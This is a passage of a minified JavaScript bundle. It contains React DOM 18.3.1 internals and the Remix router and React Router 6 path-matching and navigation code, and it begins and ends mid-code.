s0;s0=function(t,e,n){if(t!==null)if(t.memoizedProps!==e.pendingProps||pn.current)dn=!0;else{if(!(t.lanes&n)&&!(e.flags&128))return dn=!1,Ly(t,e,n);dn=!!(t.flags&131072)}else dn=!1,mt&&e.flags&1048576&&lv(e,El,e.index);switch(e.lanes=0,e.tag){case 2:var i=e.type;il(t,e),t=e.pendingProps;var s=Cr(e,Jt.current);wr(e,n),s=zp(null,e,i,t,s,n);var r=Vp();return e.flags|=1,typeof s=="object"&&s!==null&&typeof s.render=="function"&&s.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,hn(i)?(r=!0,wl(e)):r=!1,e.memoizedState=s.state!==null&&s.state!==void 0?s.state:null,Ip(e),s.updater=Zl,e.stateNode=s,s._reactInternals=e,Ku(e,i,t,n),e=Qu(null,e,i,!0,r,n)):(e.tag=0,mt&&r&&Cp(e),tn(null,e,s,n),e=e.child),e;case 16:i=e.elementType;e:{switch(il(t,e),t=e.pendingProps,s=i._init,i=s(i._payload),e.type=i,s=e.tag=Xy(i),t=Vn(i,t),s){case 0:e=Ju(null,e,i,t,n);break e;case 1:e=Mf(null,e,i,t,n);break e;case 11:e=bf(null,e,i,t,n);break e;case 14:e=wf(null,e,i,Vn(i.type,t),n);break e}throw Error(se(306,i,""))}return e;case 0:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:Vn(i,s),Ju(t,e,i,s,n);case 1:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:Vn(i,s),Mf(t,e,i,s,n);case 3:e:{if(Vv(e),t===null)throw Error(se(387));i=e.pendingProps,r=e.memoizedState,s=r.element,fv(t,e),Cl(e,i,null,n);var a=e.memoizedState;if(i=a.element,r.isDehydrated)if(r={element:i,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},e.updateQueue.baseState=r,e.memoizedState=r,e.flags&256){s=kr(Error(se(423)),e),e=Ef(t,e,i,n,s);break e}else if(i!==s){s=kr(Error(se(424)),e),e=Ef(t,e,i,n,s);break e}else for(bn=ts(e.stateNode.containerInfo.firstChild),wn=e,mt=!0,Gn=null,n=pv(e,null,i,n),e.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(Rr(),i===s){e=Pi(t,e,n);break e}tn(t,e,i,n)}e=e.child}return e;case 5:return mv(e),t===null&&qu(e),i=e.type,s=e.pendingProps,r=t!==null?t.memoizedProps:null,a=s.children,Hu(i,s)?a=null:r!==null&&Hu(i,r)&&(e.flags|=32),zv(t,e),tn(t,e,a,n),e.child;case 6:return t===null&&qu(e),null;case 13:return Hv(t,e,n);case 4:return Up(e,e.stateNode.containerInfo),i=e.pendingProps,t===null?e.child=Pr(e,null,i,n):tn(t,e,i,n),e.child;case 11:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:Vn(i,s),bf(t,e,i,s,n);case 7:return tn(t,e,e.pendingProps,n),e.child;case 8:return tn(t,e,e.pendingProps.children,n),e.child;case 12:return tn(t,e,e.pendingProps.children,n),e.child;case 10:e:{if(i=e.type._context,s=e.pendingProps,r=e.memoizedProps,a=s.value,dt(Tl,i._currentValue),i._currentValue=a,r!==null)if(Yn(r.value,a)){if(r.children===s.children&&!pn.current){e=Pi(t,e,n);break e}}else for(r=e.child,r!==null&&(r.return=e);r!==null;){var o=r.dependencies;if(o!==null){a=r.child;for(var l=o.firstContext;l!==null;){if(l.context===i){if(r.tag===1){l=Mi(-1,n&-n),l.tag=2;var c=r.updateQueue;if(c!==null){c=c.shared;var d=c.pending;d===null?l.next=l:(l.next=d.next,d.next=l),c.pending=l}}r.lanes|=n,l=r.alternate,l!==null&&(l.lanes|=n),Yu(r.return,n,e),o.lanes|=n;break}l=l.next}}else if(r.tag===10)a=r.type===e.type?null:r.child;else if(r.tag===18){if(a=r.return,a===null)throw Error(se(341));a.lanes|=n,o=a.alternate,o!==null&&(o.lanes|=n),Yu(a,n,e),a=r.sibling}else a=r.child;if(a!==null)a.return=r;else for(a=r;a!==null;){if(a===e){a=null;break}if(r=a.sibling,r!==null){r.return=a.return,a=r;break}a=a.return}r=a}tn(t,e,s.children,n),e=e.child}return e;case 9:return s=e.type,i=e.pendingProps.children,wr(e,n),s=In(s),i=i(s),e.flags|=1,tn(t,e,i,n),e.child;case 14:return i=e.type,s=Vn(i,e.pendingProps),s=Vn(i.type,s),wf(t,e,i,s,n);case 15:return Fv(t,e,e.type,e.pendingProps,n);case 17:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:Vn(i,s),il(t,e),e.tag=1,hn(i)?(t=!0,wl(e)):t=!1,wr(e,n),Iv(e,i,s),Ku(e,i,s,n),Qu(null,e,i,!0,t,n);case 19:return Gv(t,e,n);case 22:return Bv(t,e,n)}throw Error(se(156,e.tag))};function r0(t,e){return kg(t,e)}function jy(t,e,n,i){this.tag=t,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=i,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Nn(t,e,n,i){return new jy(t,e,n,i)}function Zp(t){return t=t.prototype,!(!t||!t.isReactComponent)}function Xy(t){if(typeof t=="function")return Zp(t)?1:0;if(t!=null){if(t=t.$$typeof,t===gp)return 11;if(t===vp)return 14}return 2}function rs(t,e){var n=t.alternate;return n===null?(n=Nn(t.tag,e,t.key,t.mode),n.elementType=t.elementType,n.type=t.type,n.stateNode=t.stateNode,n.alternate=t,t.alternate=n):(n.pendingProps=e,n.type=t.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=t.flags&14680064,n.childLanes=t.childLanes,n.lanes=t.lanes,n.child=t.child,n.memoizedProps=t.memoizedProps,n.memoizedState=t.memoizedState,n.updateQueue=t.updateQueue,e=t.dependencies,n.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},n.sibling=t.sibling,n.index=t.index,n.ref=t.ref,n}function al(t,e,n,i,s,r){var a=2;if(i=t,typeof t=="function")Zp(t)&&(a=1);else if(typeof t=="string")a=5;else e:switch(t){case lr:return Ds(n.children,s,r,e);case mp:a=8,s|=8;break;case yu:return t=Nn(12,n,e,s|2),t.elementType=yu,t.lanes=r,t;case Su:return t=Nn(13,n,e,s),t.elementType=Su,t.lanes=r,t;case bu:return t=Nn(19,n,e,s),t.elementType=bu,t.lanes=r,t;case mg:return ec(n,s,r,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case hg:a=10;break e;case fg:a=9;break e;case gp:a=11;break e;case vp:a=14;break e;case Gi:a=16,i=null;break e}throw Error(se(130,t==null?t:typeof t,""))}return e=Nn(a,n,e,s),e.elementType=t,e.type=i,e.lanes=r,e}function Ds(t,e,n,i){return t=Nn(7,t,i,e),t.lanes=n,t}function ec(t,e,n,i){return t=Nn(22,t,i,e),t.elementType=mg,t.lanes=n,t.stateNode={isHidden:!1},t}function Oc(t,e,n){return t=Nn(6,t,null,e),t.lanes=n,t}function Fc(t,e,n){return e=Nn(4,t.children!==null?t.children:[],t.key,e),e.lanes=n,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function qy(t,e,n,i,s){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=_c(0),this.expirationTimes=_c(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=_c(0),this.identifierPrefix=i,this.onRecoverableError=s,this.mutableSourceEagerHydrationData=null}function Jp(t,e,n,i,s,r,a,o,l){return t=new qy(t,e,n,o,l),e===1?(e=1,r===!0&&(e|=8)):e=0,r=Nn(3,null,null,e),t.current=r,r.stateNode=t,r.memoizedState={element:i,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Ip(r),t}function Yy(t,e,n){var i=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:or,key:i==null?null:""+i,children:t,containerInfo:e,implementation:n}}function a0(t){if(!t)return ls;t=t._reactInternals;e:{if(Hs(t)!==t||t.tag!==1)throw Error(se(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(hn(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(se(171))}if(t.tag===1){var n=t.type;if(hn(n))return av(t,n,e)}return e}function o0(t,e,n,i,s,r,a,o,l){return t=Jp(n,i,!0,t,s,r,a,o,l),t.context=a0(null),n=t.current,i=nn(),s=ss(n),r=Mi(i,s),r.callback=e??null,ns(n,r,s),t.current.lanes=s,Za(t,s,i),fn(t,i),t}function tc(t,e,n,i){var s=e.current,r=nn(),a=ss(s);return n=a0(n),e.context===null?e.context=n:e.pendingContext=n,e=Mi(r,a),e.payload={element:t},i=i===void 0?null:i,i!==null&&(e.callback=i),t=ns(s,e,a),t!==null&&(qn(t,s,a,r),el(t,s,a)),a}function Ul(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function If(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var n=t.retryLane;t.retryLane=n!==0&&n<e?n:e}}function Qp(t,e){If(t,e),(t=t.alternate)&&If(t,e)}function $y(){return null}var l0=typeof reportError=="function"?reportError:function(t){console.error(t)};function eh(t){this._internalRoot=t}nc.prototype.render=eh.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error(se(409));tc(t,e,null,null)};nc.prototype.unmount=eh.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;Bs(function(){tc(null,t,null,null)}),e[Ci]=null}};function nc(t){this._internalRoot=t}nc.prototype.unstable_scheduleHydration=function(t){if(t){var e=Bg();t={blockedOn:null,target:t,priority:e};for(var n=0;n<ji.length&&e!==0&&e<ji[n].priority;n++);ji.splice(n,0,t),n===0&&Vg(t)}};function th(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function ic(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function Uf(){}function Ky(t,e,n,i,s){if(s){if(typeof i=="function"){var r=i;i=function(){var c=Ul(a);r.call(c)}}var a=o0(e,i,t,0,null,!1,!1,"",Uf);return t._reactRootContainer=a,t[Ci]=a.current,ka(t.nodeType===8?t.parentNode:t),Bs(),a}for(;s=t.lastChild;)t.removeChild(s);if(typeof i=="function"){var o=i;i=function(){var c=Ul(l);o.call(c)}}var l=Jp(t,0,!1,null,null,!1,!1,"",Uf);return t._reactRootContainer=l,t[Ci]=l.current,ka(t.nodeType===8?t.parentNode:t),Bs(function(){tc(e,l,n,i)}),l}function sc(t,e,n,i,s){var r=n._reactRootContainer;if(r){var a=r;if(typeof s=="function"){var o=s;s=function(){var l=Ul(a);o.call(l)}}tc(e,a,t,s)}else a=Ky(n,e,t,s,i);return Ul(a)}Og=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var n=da(e.pendingLanes);n!==0&&(yp(e,n|1),fn(e,Et()),!($e&6)&&(Nr=Et()+500,ps()))}break;case 13:Bs(function(){var i=Ri(t,1);if(i!==null){var s=nn();qn(i,t,1,s)}}),Qp(t,1)}};Sp=function(t){if(t.tag===13){var e=Ri(t,134217728);if(e!==null){var n=nn();qn(e,t,134217728,n)}Qp(t,134217728)}};Fg=function(t){if(t.tag===13){var e=ss(t),n=Ri(t,e);if(n!==null){var i=nn();qn(n,t,e,i)}Qp(t,e)}};Bg=function(){return rt};zg=function(t,e){var n=rt;try{return rt=t,e()}finally{rt=n}};ku=function(t,e,n){switch(e){case"input":if(Eu(t,n),e=n.name,n.type==="radio"&&e!=null){for(n=t;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<n.length;e++){var i=n[e];if(i!==t&&i.form===t.form){var s=Yl(i);if(!s)throw Error(se(90));vg(i),Eu(i,s)}}}break;case"textarea":xg(t,n);break;case"select":e=n.value,e!=null&&xr(t,!!n.multiple,e,!1)}};Tg=Yp;Ag=Bs;var Zy={usingClientEntryPoint:!1,Events:[Qa,pr,Yl,Mg,Eg,Yp]},ea={findFiberByHostInstance:As,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Jy={bundleType:ea.bundleType,version:ea.version,rendererPackageName:ea.rendererPackageName,rendererConfig:ea.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Ni.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=Pg(t),t===null?null:t.stateNode},findFiberByHostInstance:ea.findFiberByHostInstance||$y,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var To=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!To.isDisabled&&To.supportsFiber)try{Wl=To.inject(Jy),ii=To}catch{}}En.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Zy;En.createPortal=function(t,e){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!th(e))throw Error(se(200));return Yy(t,e,null,n)};En.createRoot=function(t,e){if(!th(t))throw Error(se(299));var n=!1,i="",s=l0;return e!=null&&(e.unstable_strictMode===!0&&(n=!0),e.identifierPrefix!==void 0&&(i=e.identifierPrefix),e.onRecoverableError!==void 0&&(s=e.onRecoverableError)),e=Jp(t,1,!1,null,null,n,!1,i,s),t[Ci]=e.current,ka(t.nodeType===8?t.parentNode:t),new eh(e)};En.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error(se(188)):(t=Object.keys(t).join(","),Error(se(268,t)));return t=Pg(e),t=t===null?null:t.stateNode,t};En.flushSync=function(t){return Bs(t)};En.hydrate=function(t,e,n){if(!ic(e))throw Error(se(200));return sc(null,t,e,!0,n)};En.hydrateRoot=function(t,e,n){if(!th(t))throw Error(se(405));var i=n!=null&&n.hydratedSources||null,s=!1,r="",a=l0;if(n!=null&&(n.unstable_strictMode===!0&&(s=!0),n.identifierPrefix!==void 0&&(r=n.identifierPrefix),n.onRecoverableError!==void 0&&(a=n.onRecoverableError)),e=o0(e,null,t,1,n??null,s,!1,r,a),t[Ci]=e.current,ka(t),i)for(t=0;t<i.length;t++)n=i[t],s=n._getVersion,s=s(n._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[n,s]:e.mutableSourceEagerHydrationData.push(n,s);return new nc(e)};En.render=function(t,e,n){if(!ic(e))throw Error(se(200));return sc(null,t,e,!1,n)};En.unmountComponentAtNode=function(t){if(!ic(t))throw Error(se(40));return t._reactRootContainer?(Bs(function(){sc(null,null,t,!1,function(){t._reactRootContainer=null,t[Ci]=null})}),!0):!1};En.unstable_batchedUpdates=Yp;En.unstable_renderSubtreeIntoContainer=function(t,e,n,i){if(!ic(n))throw Error(se(200));if(t==null||t._reactInternals===void 0)throw Error(se(38));return sc(t,e,n,!1,i)};En.version="18.3.1-next-f1338f8080-20240426";function c0(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(c0)}catch(t){console.error(t)}}c0(),cg.exports=En;var Qy=cg.exports,u0,Of=Qy;u0=Of.createRoot,Of.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Va(){return Va=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},Va.apply(this,arguments)}var Ki;(function(t){t.Pop="POP",t.Push="PUSH",t.Replace="REPLACE"})(Ki||(Ki={}));const Ff="popstate";function eS(t){t===void 0&&(t={});function e(i,s){let{pathname:r,search:a,hash:o}=i.location;return dd("",{pathname:r,search:a,hash:o},s.state&&s.state.usr||null,s.state&&s.state.key||"default")}function n(i,s){return typeof s=="string"?s:Ol(s)}return nS(e,n,null,t)}function Rt(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function nh(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function tS(){return Math.random().toString(36).substr(2,8)}function Bf(t,e){return{usr:t.state,key:t.key,idx:e}}function dd(t,e,n,i){return n===void 0&&(n=null),Va({pathname:typeof t=="string"?t:t.pathname,search:"",hash:""},typeof e=="string"?Hr(e):e,{state:n,key:e&&e.key||i||tS()})}function Ol(t){let{pathname:e="/",search:n="",hash:i=""}=t;return n&&n!=="?"&&(e+=n.charAt(0)==="?"?n:"?"+n),i&&i!=="#"&&(e+=i.charAt(0)==="#"?i:"#"+i),e}function Hr(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substr(n),t=t.substr(0,n));let i=t.indexOf("?");i>=0&&(e.search=t.substr(i),t=t.substr(0,i)),t&&(e.pathname=t)}return e}function nS(t,e,n,i){i===void 0&&(i={});let{window:s=document.defaultView,v5Compat:r=!1}=i,a=s.history,o=Ki.Pop,l=null,c=d();c==null&&(c=0,a.replaceState(Va({},a.state,{idx:c}),""));function d(){return(a.state||{idx:null}).idx}function p(){o=Ki.Pop;let m=d(),u=m==null?null:m-c;c=m,l&&l({action:o,location:y.location,delta:u})}function h(m,u){o=Ki.Push;let g=dd(y.location,m,u);c=d()+1;let x=Bf(g,c),S=y.createHref(g);try{a.pushState(x,"",S)}catch(T){if(T instanceof DOMException&&T.name==="DataCloneError")throw T;s.location.assign(S)}r&&l&&l({action:o,location:y.location,delta:1})}function f(m,u){o=Ki.Replace;let g=dd(y.location,m,u);c=d();let x=Bf(g,c),S=y.createHref(g);a.replaceState(x,"",S),r&&l&&l({action:o,location:y.location,delta:0})}function _(m){let u=s.location.origin!=="null"?s.location.origin:s.location.href,g=typeof m=="string"?m:Ol(m);return g=g.replace(/ $/,"%20"),Rt(u,"No window.location.(origin|href) available to create URL for href: "+g),new URL(g,u)}let y={get action(){return o},get location(){return t(s,a)},listen(m){if(l)throw new Error("A history only accepts one active listener");return s.addEventListener(Ff,p),l=m,()=>{s.removeEventListener(Ff,p),l=null}},createHref(m){return e(s,m)},createURL:_,encodeLocation(m){let u=_(m);return{pathname:u.pathname,search:u.search,hash:u.hash}},push:h,replace:f,go(m){return a.go(m)}};return y}var zf;(function(t){t.data="data",t.deferred="deferred",t.redirect="redirect",t.error="error"})(zf||(zf={}));function iS(t,e,n){return n===void 0&&(n="/"),sS(t,e,n)}function sS(t,e,n,i){let s=typeof e=="string"?Hr(e):e,r=ih(s.pathname||"/",n);if(r==null)return null;let a=d0(t);rS(a);let o=null;for(let l=0;o==null&&l<a.length;++l){let c=vS(r);o=fS(a[l],c)}return o}function d0(t,e,n,i){e===void 0&&(e=[]),n===void 0&&(n=[]),i===void 0&&(i="");let s=(r,a,o)=>{let l={relativePath:o===void 0?r.path||"":o,caseSensitive:r.caseSensitive===!0,childrenIndex:a,route:r};l.relativePath.startsWith("/")&&(Rt(l.relativePath.startsWith(i),'Absolute route path "'+l.relativePath+'" nested under path '+('"'+i+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),l.relativePath=l.relativePath.slice(i.length));let c=as([i,l.relativePath]),d=n.concat(l);r.children&&r.children.length>0&&(Rt(r.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),d0(r.children,e,d,c)),!(r.path==null&&!r.index)&&e.push({path:c,score:pS(c,r.index),routesMeta:d})};return t.forEach((r,a)=>{var o;if(r.path===""||!((o=r.path)!=null&&o.includes("?")))s(r,a);else for(let l of p0(r.path))s(r,a,l)}),e}function p0(t){let e=t.split("/");if(e.length===0)return[];let[n,...i]=e,s=n.endsWith("?"),r=n.replace(/\?$/,"");if(i.length===0)return s?[r,""]:[r];let a=p0(i.join("/")),o=[];return o.push(...a.map(l=>l===""?r:[r,l].join("/"))),s&&o.push(...a),o.map(l=>t.startsWith("/")&&l===""?"/":l)}function rS(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:hS(e.routesMeta.map(i=>i.childrenIndex),n.routesMeta.map(i=>i.childrenIndex)))}const aS=/^:[\w-]+$/,oS=3,lS=2,cS=1,uS=10,dS=-2,Vf=t=>t==="*";function pS(t,e){let n=t.split("/"),i=n.length;return n.some(Vf)&&(i+=dS),e&&(i+=lS),n.filter(s=>!Vf(s)).reduce((s,r)=>s+(aS.test(r)?oS:r===""?cS:uS),i)}function hS(t,e){return t.length===e.length&&t.slice(0,-1).every((i,s)=>i===e[s])?t[t.length-1]-e[e.length-1]:0}function fS(t,e,n){let{routesMeta:i}=t,s={},r="/",a=[];for(let o=0;o<i.length;++o){let l=i[o],c=o===i.length-1,d=r==="/"?e:e.slice(r.length)||"/",p=mS({path:l.relativePath,caseSensitive:l.caseSensitive,end:c},d),h=l.route;if(!p)return null;Object.assign(s,p.params),a.push({params:s,pathname:as([r,p.pathname]),pathnameBase:bS(as([r,p.pathnameBase])),route:h}),p.pathnameBase!=="/"&&(r=as([r,p.pathnameBase]))}return a}function mS(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,i]=gS(t.path,t.caseSensitive,t.end),s=e.match(n);if(!s)return null;let r=s[0],a=r.replace(/(.)\/+$/,"$1"),o=s.slice(1);return{params:i.reduce((c,d,p)=>{let{paramName:h,isOptional:f}=d;if(h==="*"){let y=o[p]||"";a=r.slice(0,r.length-y.length).replace(/(.)\/+$/,"$1")}const _=o[p];return f&&!_?c[h]=void 0:c[h]=(_||"").replace(/%2F/g,"/"),c},{}),pathname:r,pathnameBase:a,pattern:t}}function gS(t,e,n){e===void 0&&(e=!1),n===void 0&&(n=!0),nh(t==="*"||!t.endsWith("*")||t.endsWith("/*"),'Route path "'+t+'" will be treated as if it were '+('"'+t.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+t.replace(/\*$/,"/*")+'".'));let i=[],s="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,o,l)=>(i.push({paramName:o,isOptional:l!=null}),l?"/?([^\\/]+)?":"/([^\\/]+)"));return t.endsWith("*")?(i.push({paramName:"*"}),s+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?s+="\\/*$":t!==""&&t!=="/"&&(s+="(?:(?=\\/|$))"),[new RegExp(s,e?void 0:"i"),i]}function vS(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return nh(!1,'The URL path "'+t+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+e+").")),t}}function ih(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,i=t.charAt(n);return i&&i!=="/"?null:t.slice(n)||"/"}const _S=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,xS=t=>_S.test(t);function yS(t,e){e===void 0&&(e="/");let{pathname:n,search:i="",hash:s=""}=typeof t=="string"?Hr(t):t,r;if(n)if(xS(n))r=n;else{if(n.includes("//")){let a=n;n=n.replace(/\/\/+/g,"/"),nh(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+n))}n.startsWith("/")?r=Hf(n.substring(1),"/"):r=Hf(n,e)}else r=e;return{pathname:r,search:wS(i),hash:MS(s)}}function Hf(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(s=>{s===".."?n.length>1&&n.pop():s!=="."&&n.push(s)}),n.length>1?n.join("/"):"/"}function Bc(t,e,n,i){return"Cannot include a '"+t+"' character in a manually specified "+("`to."+e+"` field ["+JSON.stringify(i)+"].  Please separate it out to the ")+("`to."+n+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function SS(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function h0(t,e){let n=SS(t);return e?n.map((i,s)=>s===n.length-1?i.pathname:i.pathnameBase):n.map(i=>i.pathnameBase)}function f0(t,e,n,i){i===void 0&&(i=!1);let s;typeof t=="string"?s=Hr(t):(s=Va({},t),Rt(!s.pathname||!s.pathname.includes("?"),Bc("?","pathname","search",s)),Rt(!s.pathname||!s.pathname.includes("#"),Bc("#","pathname","hash",s)),Rt(!s.search||!s.search.includes("#"),Bc("#","search","hash",s)));let r=t===""||s.pathname==="",a=r?"/":s.pathname,o;if(a==null)o=n;else{let p=e.length-1;if(!i&&a.startsWith("..")){let h=a.split("/");for(;h[0]==="..";)h.shift(),p-=1;s.pathname=h.join("/")}o=p>=0?e[p]:"/"}let l=yS(s,o),c=a&&a!=="/"&&a.endsWith("/"),d=(r||a===".")&&n.endsWith("/");return!l.pathname.endsWith("/")&&(c||d)&&(l.pathname+="/"),l}const as=t=>t.join("/").replace(/\/\/+/g,"/"),bS=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),wS=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,MS=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function ES(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}const m0=["post","put","patch","delete"];new Set(m0);const TS=["get",...m0];new Set(TS);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ha(){return Ha=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},Ha.apply(this,arguments)}const sh=ee.createContext(null),AS=ee.createContext(null),Gs=ee.createContext(null),rc=ee.createContext(null),hs=ee.createContext({outlet:null,matches:[],isDataRoute:!1}),g0=ee.createContext(null);function CS(t,e){let{relative:n}=e===void 0?{}:e;to()||Rt(!1);let{basename:i,navigator:s}=ee.useContext(Gs),{hash:r,pathname:a,search:o}=x0(t,{relative:n}),l=a;return i!=="/"&&(l=a==="/"?i:as([i,a])),s.createHref({pathname:l,search:o,hash:r})}function to(){return ee.useContext(rc)!=null}function no(){return to()||Rt(!1),ee.useContext(rc).location}function v0(t){ee.useContext(Gs).static||ee.useLayoutEffect(t)}function _0(){let{isDataRoute:t}=ee.useContext(hs);return t?HS():RS()}function RS(){to()||Rt(!1);let t=ee.useContext(sh),{basename:e,future:n,navigator:i}=ee.useContext(Gs),{matches:s}=ee.useContext(hs),{pathname:r}=no(),a=JSON.stringify(h0(s,n.v7_relativeSplatPath)),o=ee.useRef(!1);return v0(()=>{o.current=!0}),ee.useCallback(function(c,d){if(d===void 0&&(d={}),!o.current)return;if(typeof c=="number"){i.go(c);return}let p=f0(c,JSON.parse(a),r,d.relative==="path");t==null&&e!=="/"&&(p.pathname=p.pathname==="/"?e:as([e,p.pathname])),(d.replace?i.replace:i.push)(p,d.state,d)},[e,i,a,r,t])}function PS(){let{matches:t}=ee.useContext(hs),e=t[t.length-1];return e?e.params:{}}function x0(t,e){let{relative:n}=e===void 0?{}:e,{future:i}=ee.useContext(Gs),{matches:s}=ee.useContext(hs),{pathname:r}=no(),a=JSON.stringify(h0(s,i.v7_relativeSplatPath));return ee.useMemo(()=>f0(t,JSON.parse(a),r,n==="path"),[t,a,r,n])}function LS(t,e){return kS(t,e)}function kS(t,e,n,i){to()||Rt(!1);let{navigator:s}=ee.useContext(Gs),{matches:r}=ee.useContext(hs),a=r[r.length-1],o=a?a.params:{};a&&a.pathname;let l=a?a.pathnameBase:"/";a&&a.route;let c=no(),d;if(e){var p;let m=typeof e=="string"?Hr(e):e;l==="/"||(p=m.pathname)!=null&&p.startsWith(l)||Rt(!1),d=m}else d=c;let h=d.pathname||"/",f=h;if(l!=="/"){let m=l.replace(/^\//,"").split("/");f="/"+h.replace(/^\//,"").split("/").slice(m.length).join("/")}let _=iS(t,{pathname:f}),y=OS(_&&_.map(m=>Object.assign({},m,{params:Object.assign({},o,m.params),pathname:as([l,s.encodeLocation?s.encodeLocation(m.pathname).pathname:m.pathname]),pathnameBase:m.pathnameBase==="/"?l:as([l,s.encodeLocation?s.encodeLocation(m.pathnameBase).pathname:m.pathnameBase])})),r,n,i);return e&&y?ee.createElement(rc.Provider,{value:{location:Ha({pathname:"/",search:"",hash:"",state:null,key:"default"},d),navigationType:Ki.Pop}},y):y}function NS(){let t=VS(),e=ES(t)?t.status+" "+t.statusText:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,s={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return ee.createElement(ee.Fragment,null,ee.createElement("h2",null,"Unexpected Application 